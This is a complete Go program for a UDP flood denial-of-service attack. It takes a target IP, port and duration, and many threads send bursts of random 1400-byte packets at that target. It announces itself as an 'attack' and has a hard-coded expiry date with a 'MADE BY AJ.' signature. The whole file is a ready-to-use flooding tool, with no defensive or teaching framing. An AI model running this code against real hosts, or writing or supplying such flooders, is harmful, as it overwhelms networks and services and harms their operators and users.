package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"math"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const (
	packetSize = 1400
	expiryDate = "2025-07-25T13:00:00"
)

var (
	countdownInterval = flag.Int("countdown", 1, "Countdown interval in seconds")
	maxRetries        = flag.Int("retries", 3, "Maximum number of retries for failed packets")
	retryDelay        = flag.Duration("retrydelay", time.Millisecond*10, "Delay before retrying a failed packet")
	burstSize         = flag.Int("burstsize", 10, "Number of packets to send in a burst")
)

// Stats keeps track of statistics during the attack
type Stats struct {
	PacketsSent       uint64
	PacketsSuccessful uint64
	PacketsFailed     uint64
	BytesSent         uint64
}

func main() {
	checkExpiry()

	// Parse flags
	flag.Parse()

	if len(flag.Args()) != 3 {
		fmt.Printf("Usage: %s <target_ip> <target_port> <attack_duration>\n", os.Args[0])
		flag.PrintDefaults()
		return
	}

	targetIP := flag.Arg(0)
	targetPort := flag.Arg(1)
	attackDuration, err := strconv.Atoi(flag.Arg(2))
	if err != nil || attackDuration <= 0 {
		fmt.Println("Invalid attack duration:", err)
		return
	}
	durationTime := time.Duration(attackDuration) * time.Second

	numThreads := max(2, int(math.Ceil(float64(runtime.NumCPU())*3)))

	var wg sync.WaitGroup
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	stats := &Stats{}

	go func() {
		<-signalChan
		fmt.Println("\nReceived interrupt signal, shutting down...")
		cancel()
	}()

	fmt.Printf("Starting UDP flood attack on %s:%s for %d seconds with %d threads...\n", targetIP, targetPort, attackDuration, numThreads)

	targetAddr := net.JoinHostPort(targetIP, targetPort)
	packet := generatePacket(packetSize)

	// Start sending packets
	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go sendUDPPackets(ctx, targetAddr, packet, durationTime, &wg, stats)
	}

	go countdownTimer(durationTime, ctx)

	// Wait for all goroutines to complete
	wg.Wait()
	fmt.Println("Attack completed.")
}

func checkExpiry() {
	currentDate := time.Now()
	expiry, err := time.Parse("2006-01-02T15:04:05", expiryDate)
	if err != nil {
		log.Fatalf("Error parsing expiry date: %v\n", err)
	}
	if currentDate.After(expiry) {
		fmt.Println("MADE BY AJ.")
		os.Exit(1)
	}
}

func sendUDPPackets(ctx context.Context, targetAddr string, packet []byte, duration time.Duration, wg *sync.WaitGroup, stats *Stats) {
	defer wg.Done()
	endTime := time.Now().Add(duration)

	conn, err := createConnection(targetAddr)
	if err != nil {
		log.Printf("Error creating UDP connection: %v\n", err)
		return
	}
	defer conn.Close()

	for {
		select {
		case <-ctx.Done():
			return
		default:
			if time.Now().After(endTime) {
				return
			}

			for i := 0; i < *burstSize; i++ {
				sendPacket(conn, packet, stats)
			}

			// Optionally, you can add a short sleep to reduce load
			// time.Sleep(time.Millisecond * 100)
		}
	}
}

func sendPacket(conn *net.UDPConn, packet []byte, stats *Stats) {
	retries := 0
	for retries < *maxRetries {
		n, err := conn.Write(packet)
		if err != nil {
			retries++
			time.Sleep(*retryDelay * time.Duration(1<<retries)) // Exponential backoff
			continue
		}

		atomic.AddUint64(&stats.PacketsSent, 1)
		if n == len(packet) {
			atomic.AddUint64(&stats.PacketsSuccessful, 1)
			atomic.AddUint64(&stats.BytesSent, uint64(n))
		} else {
			atomic.AddUint64(&stats.PacketsFailed, 1)
		}
		return
	}

	atomic.AddUint64(&stats.PacketsFailed, 1)
}

func createConnection(targetAddr string) (*net.UDPConn, error) {
	udpAddr, err := net.ResolveUDPAddr("udp", targetAddr)
	if err != nil {
		return nil, err
	}

	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		return nil, err
	}

	return conn, nil
}

func generatePacket(size int) []byte {
	packet := make([]byte, size)
	rand.Read(packet)
	return packet
}

func max(x, y int) int {
	if x > y {
		return x
	}
	return y
}

func countdownTimer(duration time.Duration, ctx context.Context) {
	ticker := time.NewTicker(time.Duration(*countdownInterval) * time.Second)
	defer ticker.Stop()

	for remainingTime := int(duration.Seconds()); remainingTime > 0; remainingTime -= *countdownInterval {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			fmt.Printf("\rTime remaining: %d seconds", remainingTime)
		}
	}
	fmt.Println("\nAttack completed!")
}
